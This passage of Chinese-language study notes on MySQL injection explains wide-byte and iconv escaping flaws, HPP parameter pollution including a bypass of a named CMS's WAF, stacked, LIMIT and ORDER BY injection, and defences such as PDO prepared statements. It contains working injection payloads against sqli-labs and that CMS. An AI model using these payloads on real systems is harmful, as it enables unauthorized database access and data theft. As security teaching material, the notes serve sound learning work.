<code>0xA1~0xFE</code> ，而 <code>\\</code>  是 0x5c，是不在低位范围中的。所以， <code>0x5c</code>  根本不是 gb2312 中的编码，所以自然也是不会被吃掉的。</p>\n<p>为了解决宽字节注入，有些 cms 会用 mysql_real_escape_string 抵御，但如果我们去使用 % df，他依然会被打穿</p>\n<p>原因就是，你没有指定 php 连接 mysql 的字符集。我们需要在执行 sql 语句之前调用一下 mysql_set_charset 函数，设置当前连接的字符集为 gbk。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修复方案1</span><br><span class=\"line\">mysql_query(&quot;SET NAMES &#x27;gbk&#x27;&quot;);</span><br><span class=\"line\">mysql_real_escape_string</span><br></pre></td></tr></table></figure>\n<p>第二个解决方案就是，将 character_set_client 设置为 binary（二进制）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修复方案2</span><br><span class=\"line\">//只需在所有sql语句前指定一下连接的形式是二进制：</span><br><span class=\"line\">SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary</span><br></pre></td></tr></table></figure>\n<p>我们将 character_set_client 设置成 binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p>\n<p>接下来是双重转义的情况 —iconv 导致的致命后果</p>\n<p>(划重点，好好看，后面 file include 中会考这个函数)</p>\n<p>有些 cms 会使用如下字符集转换函数防止乱码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iconv(&#x27;utf-8&#x27;, &#x27;gbk&#x27;, $_GET[&#x27;word&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>当我们输入 <code>錦'</code>  时，他又报错了，它的 utf-8 编码是 <code>0xe98ca6</code> ，它的 gbk 编码是 <code>0xe55c</code></p>\n<p>当他从 utf8 转成 gbk 时，变成了 <code>%e5%5c%27</code> ，这时多管闲事的 addslashes 又送来了一个 <code>\\</code> ，变成了 <code>%e5%5c%5c%27</code> ，两个 5c 形成了双重转义，对 <code>'</code>  的转义失效，注入产生</p>\n<p>如果我们此时从 gbk 转为 utf8</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iconv(&#x27;gbk&#x27;, &#x27;utf-8&#x27;, $_GET[&#x27;word&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>我们再次输入 <code>%aa'</code> ，注入又发生了，因为从 gbk 转为 utf8 时，php 会两个字节一转换，一旦 <code>\\</code>  前面的字符是奇数， <code>\\</code>  就会被吞掉， <code>'</code>  逃逸</p>\n<p>那么为什么之前 utf-8 转换成 gbk 的时候，没有使用这个姿势？</p>\n<p>对于多字节的符号，其第 2、3、4 字节的前两位都是 10，也就是说， <code>\\</code> （0x0000005c）不会出现在 utf-8 编码中，所以 utf-8 转换成 gbk 时，如果有 <code>\\</code>  则 php 会报错：</p>\n<p>而 <code>\\</code>  会出现在 gbk 中，所以从 gbk 转为 utf8 会吞掉 \\</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vbXV0aWJ5dGUtc3FsLWluamVjdC5odG1s\">浅析白盒审计中的字符编码及 SQL 注入 | 离别歌 (leavesongs.com)</span></p>\n<p>sqllab less-32</p>\n<p>注意：使用 post 提交时，不能自动转为 %5c，需要使用 BP 抓包提交</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220316223957869.png\" alt=\"image-20220316223957869\"></p>\n<h5 id=\"hpp参数污染\"><a class=\"markdownIt-Anchor\" href=\"#hpp参数污染\">#</a> HPP 参数污染</h5>\n<p>sqllabs less 29:</p>\n<p>在 login.php 中，如果我们尝试闭合会产生报错，这关考点是 hpp 参数污染</p>\n<p>对于当有多个 key 相同的参数时，不同服务器获取参数与情况</p>\n<p>?id=1&amp;id=10</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220316200748174.png\" alt=\"image-20220316200748174\"></p>\n<p><strong>php 对于两个相同 key 的参数，取第二个</strong></p>\n<p>因此由于我们的环境是 php+Apache，只会接收第二个参数，我们只需要在第二个参数中注入，第一个参数可以随意提交，但 waf 过滤的却是第一个参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:18888/sqli/Less-29/login.php?id=1&amp;id=-2%27%20union%20select%201,2,3--+</span><br></pre></td></tr></table></figure>\n<h6 id=\"通过hppphp绕过贷齐乐waf\"><a class=\"markdownIt-Anchor\" href=\"#通过hppphp绕过贷齐乐waf\">#</a> 通过 HPP+PHP 绕过贷齐乐 waf</h6>\n<p>此处的 waf 会经过两层过滤，第一层过滤</p>\n<p>/core/sqlin.inc.php，包含在 config.inc.php 中，所有请求都会经由此类过滤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class sqlin &#123;</span><br><span class=\"line\">\tfunction dowith_sql($str) &#123;</span><br><span class=\"line\">\t\t$check= eregi(&#x27;select|insert|update|delete|\\&#x27;|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile&#x27;, $str);</span><br><span class=\"line\">\t\tif($check)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\techo &quot;非法字符!&quot;;</span><br><span class=\"line\">\t\t\texit();</span><br><span class=\"line\">\t\t&#125;</span><br></pre></td></tr></table></figure>\n<p>第二层过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/* 检查和转义字符 */</span><br><span class=\"line\">function safe_str($str)&#123;</span><br><span class=\"line\">    if(!get_magic_quotes_gpc()) &#123;</span><br><span class=\"line\">        if( is_array($str) ) &#123;</span><br><span class=\"line\">            foreach($str as $key =&gt; $value) &#123;</span><br><span class=\"line\">                $str[$key] = safe_str($value);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            $str = addslashes($str);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return $str;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function dhtmlspecialchars($string) &#123;</span><br><span class=\"line\">    if(is_array($string)) &#123;</span><br><span class=\"line\">        foreach($string as $key =&gt; $val) &#123;</span><br><span class=\"line\">            $string[$key] = dhtmlspecialchars($val);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $string = str_replace(array(&#x27;&amp;&#x27;, &#x27;&quot;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;,&#x27;(&#x27;,&#x27;)&#x27;), array(&#x27;&amp;amp;&#x27;, &#x27;&amp;quot;&#x27;, &#x27;&amp;lt;&#x27;, &#x27;&amp;gt;&#x27;,&#x27;（&#x27;,&#x27;）&#x27;), $string);</span><br><span class=\"line\">        if(strpos($string, &#x27;&amp;amp;#&#x27;) !== false) &#123;</span><br><span class=\"line\">            $string = preg_replace(&#x27;/&amp;amp;((#(\\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/&#x27;, &#x27;&amp;\\\\1&#x27;, $string);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return $string;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>因此该系统对于输入处理的过程如下</p>\n<p>index.php -&gt; config.inc.php -&gt; sqlin.php -&gt; safe.inc.php</p>\n<p>但我在 safe.inc.php 里找到了如下一段代码（在替换之前）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$request_uri = explode(&quot;?&quot;, $_SERVER[&#x27;REQUEST_URI&#x27;]);</span><br><span class=\"line\">if (isset($request_uri[1])) &#123;</span><br><span class=\"line\">\t$rewrite_url = explode(&quot;&amp;&quot;, $request_uri[1]);</span><br><span class=\"line\">\tforeach ($rewrite_url as $key =&gt; $value) &#123;</span><br><span class=\"line\">\t\t$_value = explode(&quot;=&quot;, $value);</span><br><span class=\"line\">\t\tif (isset($_value[1])) &#123;</span><br><span class=\"line\">\t\t\t$_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1]));</span><br><span class=\"line\">\t\t\t//$_REQUEST[$_value[0]] = addslashes($_value[1]);</span><br><span class=\"line\">\t\t\t//$_REQUEST[$_value[0]] = dhtmlspecialchars($_value[1]);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>主要内容就是通过 explode 的多次分割，将最后的 key-value 提取出来，在使用 dhtmlspecialchars 做一个转义</p>\n<p>当我们有两个相同参数时，php 是只取后一个的，假设我有一个办法，在第一次 WAF 检测参数的时候，检测的是 2，但后面覆盖 request 的时候，拿到的是 1，那么我们就可以绕过 waf</p>\n<p>但 php 的另一个特性：</p>\n<p>** 对于传入的非法的 $_GET 数组参数名，PHP 会将他们替换成下划线。** 经过 fuzz，有以下这些字符:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+ . _ [ &#x27; &#x27;</span><br></pre></td></tr></table></figure>\n<p>也就是说，php 会认为 i_d 和 i.d 是同一个参数</p>\n<p>那么假设我发送的是这样一个请求： /t.php?user_id=11111&amp;user.id=22222 ，php 先将 user.id 转换成 user_id，即为 /t.php?user_id=11111&amp;user_id=22222 ，再获取到的 $_REQUEST [‘user_id’] 就是 22222。</p>\n<p>通过 $_SERVER [‘REQUEST_URI’] 方式获得的参数，并不会对参数中的某些特殊字符进行替换。</p>\n<p>因此在\\_SERVER\\['REQUEST\\_URI'\\]中，user\\_id和user\\.id却是两个完全不同的参数名，那么切割覆盖后，获取的_REQUEST [‘user_id’] 却是 11111。</p>\n<p>如果我们要利用这个特性，那么必须满足几点：</p>\n<p>1. 有注入点</p>\n<p>2. 注入点可控变量需要获取自 $_REQUEST</p>\n<p>3. 变量的名字必须包含下划线</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static function GetOne($data = array())&#123;</span><br><span class=\"line\">    global $mysql;</span><br><span class=\"line\">    $user_id = isset($data[&#x27;user_id&#x27;])?$data[&#x27;user_id&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $username = isset($data[&#x27;username&#x27;])?$data[&#x27;username&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $password = isset($data[&#x27;password&#x27;])?$data[&#x27;password&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $email = isset($data[&#x27;email&#x27;])?$data[&#x27;email&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $type_id = isset($data[&#x27;type_id&#x27;])?$data[&#x27;type_id&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $sql = &quot;CREATE TABLE IF NOT EXISTS `&#123;user_cache&#125;` (</span><br><span class=\"line\">         `user_id` int(11) NOT NULL DEFAULT &#x27;0&#x27;)&quot;;</span><br><span class=\"line\">    $mysql -&gt;db_query($sql);</span><br></pre></td></tr></table></figure>\n<p>以上代码满足了上面的三个要求</p>\n<p>最终 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//由于=被过滤，需要使用like，同时对数据库进行16进制编码</span><br><span class=\"line\">?user_id=-1/**/Union/**/SeLect/**/1,flag,3,4/**/from/**/users/**/limit/**/0,1&amp;user.id=11</span><br><span class=\"line\">?user_id=-1/**/Union/**/SeLect/**/1,schema_name from information_schema.schemata,3,4/**/from/**/users/**/limit/**/0,1&amp;user.id=11</span><br></pre></td></tr></table></figure>\n<h5 id=\"堆叠注入\"><a class=\"markdownIt-Anchor\" href=\"#堆叠注入\">#</a> 堆叠注入</h5>\n<p>Stacked injections (堆叠注入) 从名词的含义就可以看到应该是一堆 sql 语句 (多条) 一起执行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结尾加；表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>\n<p>堆叠注入原理</p>\n<p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在；结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products 服务器端生成的 sql 语句为： Select * from products where productid=1;DELETE FROM products 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>\n<p>堆叠注入的使用条件十分有限，其可能受到 API 或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条 sql 语句时才能够使用，利用 mysqli_multi_query () 函数就支持多条 sql 语句同时执行，但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli_ query () 函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限.</p>\n<p>以 sqllab less-38 举例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class=\"line\">/* execute multi query */</span><br><span class=\"line\">if (mysqli_multi_query($con1, $sql))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    /* store first result set */</span><br><span class=\"line\">    if ($result = mysqli_store_result($con1))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if($row = mysqli_fetch_row($result))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;;\t</span><br><span class=\"line\">            printf(&quot;Your Username is : %s&quot;, $row[1]);</span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">            printf(&quot;Your Password is : %s&quot;, $row[2]);</span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">//            mysqli_free_result($result);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        /* print divider */</span><br><span class=\"line\">    if (mysqli_more_results($con1))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">            //printf(&quot;-----------------\\n&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">     //while (mysqli_next_result($con1));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\techo &#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class=\"line\">\tprint_r(mysqli_error($con1));</span><br><span class=\"line\">\techo &quot;&lt;/font&gt;&quot;;  </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">/* close connection */</span><br><span class=\"line\">mysqli_close($con1);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>堆叠注入部分参考链接：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmFja2xpb24vcC85NzIxNjg3Lmh0bWw=\">https://www.cnblogs.com/backlion/p/9721687.html</span></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220321165558549.png\" alt=\"image-20220321165558549\" style=\"zoom:67%;\" />\n<h5 id=\"update-insert语句中注入\"><a class=\"markdownIt-Anchor\" href=\"#update-insert语句中注入\">#</a> update /insert 语句中注入</h5>\n<p>sqllab pass-17</p>\n<p>数据外带</p>\n<p>floor 报错注入</p>\n<p><strong>注意：update 语句中使用 updatexml 和 extractvalue 报错注入时 update 不会执行，因为 xpath 报错导致程序退出</strong></p>\n<h5 id=\"limit中注入\"><a class=\"markdownIt-Anchor\" href=\"#limit中注入\">#</a> limit 中注入</h5>\n<p>只适用于 mysql 版本 &lt; 5.5</p>\n<p>使用存储过程</p>\n<p>为什么要用存储过程？<br>\n①将重复性很高的一些操作，封装到一个存储过程中，简化了对这些 SQL 的调用</p>\n<p>②批量处理：SQL + 循环，减少流量</p>\n<p>③统一接口，确保数据的安全</p>\n<p>使用存储过程：</p>\n<p>procedure analyse (1,2) 报错在第一个参数上</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure>\n<p>时间盲注时但存储过程无法使用 sleep，无法盲注，使用 benchmark 代替 sleep</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure>\n<h5 id=\"order-by注入\"><a class=\"markdownIt-Anchor\" href=\"#order-by注入\">#</a> order by 注入</h5>\n<p>order by 是 mysql 中对查询数据进行排序的方法， 使用示例</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> 表名 <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> 列名(或者数字) <span class=\"keyword\">asc</span>;  #升序(默认升序)</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> 表名 <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> 列名(或者数字) <span class=\"keyword\">desc</span>;  #降序</span><br></pre></td></tr></table></figure>\n<p>这里的重点在于 order by 后既可以填列名或者是一个数字。举个例子： id 是 user 表的第一列的列名，那么如果想根据 id 来排序，有两种写法:</p>\n<p>因此这也就是我们为什么通过 order by 判断列数，我们会把第 x 当做 order by 的条件，如果没有 x 则报错</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> id;</span><br><span class=\"line\">selecr <span class=\"operator\">*</span> <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>基于 if 盲注：</p>\n<p>需要知道列名</p>\n<p>order by 的列不同，返回的页面当然也是不同的，所以就可以根据排序的列不同来盲注。</p>\n<p>这里如果使用数字代替列名是不行的，因为 if 语句返回的是字符类型，不是整型。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by if(1=1,id,username);</span><br><span class=\"line\">order by if(表达式,1,(select id from information_schema.tables))</span><br></pre></td></tr></table></figure>\n<p>如果表达式为 false 时，sql 语句会报 ERROR 1242 (21000): Subquery returns more than 1 row 的错误，导致查询内容为空，如果表达式为 true 是，则会返回正常的页面</p>\n<p>基于时间盲注</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by if(1=1,1,sleep(1))</span><br></pre></td></tr></table></figure>\n<p>基于 rand () 盲</p>\n<p>可以看到当 rand () 为 true 和 false 时，排序结果是不同的，所以就可以使用 rand () 函数进行盲注了。 rand (true) | rand (false)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by rand(ascii(mid((select database()),1,1))&gt;96)</span><br></pre></td></tr></table></figure>\n<p>基于报错注入：</p>\n<p>updatexml 和 extravalue</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from ha order by updatexml(1,if(1=1,1,user()),1);#查询正常</span><br><span class=\"line\">select * from ha order by updatexml(1,if(1=2,1,user()),1);#查询报错</span><br></pre></td></tr></table></figure>\n<p>order by 注入的实例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &#x27;select * from admin where username=&#x27;&quot;.$username.&quot;&#x27;&#x27;;</span><br><span class=\"line\">$result = mysql_query($sql);</span><br><span class=\"line\">$row = mysql_fetch_array($result);</span><br><span class=\"line\">if(isset($row)&amp;&amp;row[&#x27;username&#x27;]!=&quot;admin&quot;)&#123;</span><br><span class=\"line\">\t$hit=&quot;username error!&quot;;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\tif ($row[&#x27;password&#x27;] === $password)&#123;</span><br><span class=\"line\">\t\t$hit=&quot;&quot;;</span><br><span class=\"line\">\t&#125;else&#123;</span><br><span class=\"line\">\t\t$hit=&quot;password error!&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">             </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username=admin&#x27; union 1,2,&#x27;字符串&#x27; order by 3</span><br></pre></td></tr></table></figure>\n<p>或者一般存在的注入点为：可控制的位置在 <code>order by</code>  子句后，如下 order 参数可控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;select * from goods order by $_GET[&#x27;order&#x27;]&quot;</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaWNlei9wL015c3FsLU9yZGVyLUJ5LUluamVjdGlvbi1TdW1tYXJ5Lmh0bWw=\">Mysql Order By 注入总结 - 艾斯泽 - 博客园 (cnblogs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NjI3Nzg1L2FydGljbGUvZGV0YWlscy8xMTk0MTQwMzI=\">sql 注入之 order by 注入_夜影_321 的博客 - CSDN 博客_orderby sql 注入</span></p>\n<h3 id=\"mysql注入防御\"><a class=\"markdownIt-Anchor\" href=\"#mysql注入防御\">#</a> mysql 注入防御</h3>\n<h4 id=\"通过函数过滤\"><a class=\"markdownIt-Anchor\" href=\"#通过函数过滤\">#</a> 通过函数过滤</h4>\n<p><code>$id = addslashed($id);</code>  使用 \\ 转义字符，比如’ &quot; \\ NULL</p>\n<p>注意 GPG 开关开启时会默认转义所有输入，如果这时才使用此函数会造成双重转义使转义失效</p>\n<p><code>$id = addcslashed($id); </code>  使用 c 语言风格转义函数 \\0 \\r 等</p>\n<h4 id=\"降权\"><a class=\"markdownIt-Anchor\" href=\"#降权\">#</a> 降权</h4>\n<p>给每个数据库设置单独的管理员，不使用 root，sa 等高权限用户</p>\n<h4 id=\"使用pdo\"><a class=\"markdownIt-Anchor\" href=\"#使用pdo\">#</a> 使用 PDO</h4>\n<p>预处理语句可以把它看作是想要运行的 SQL 的一种编译过的模板，它可以使用变量参数进行定制。</p>\n<p>查询仅需解析（或预处理）一次，但可以用相同或不同的参数执行多次。当查询准备好后，数据库将分析、编译和优化执行该查询的计划。</p>\n<p>提供给预处理语句的参数不需要用引号括起来，驱动程序会自动处理。如果应用程序只使用预处理语句，可以确保不会发生 SQL 注入。</p>\n<p>预处理语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$pdo = new PDO(&quot;mysql:host=127.0.0.1;dbname=test;charset=utf8&quot;, &quot;root&quot;,&quot;root123&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$st = $pdo-&gt;prepare(&quot;select * from users where id =?&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$id = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">$st-&gt;bindParam(1, $id);</span><br><span class=\"line\">$st-&gt;execute();</span><br><span class=\"line\">$ret = $st-&gt;fetchAll();</span><br><span class=\"line\">print_r($ret);</span><br></pre></td></tr></table></figure>\n<p>这与我们平时使用 mysql_real_escape_string 将字符串进行转义，再拼接成 SQL 语句没有差别，只是由 PDO 本地驱动完成转义的（EMULATE_PREPARES）</p>\n<p>PDO 有一项参数，名为 PDO::ATTR_EMULATE_PREPARES ，表示是否使用 PHP 本地模拟 prepare，此项参数默认 true, 我们改为 false 后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 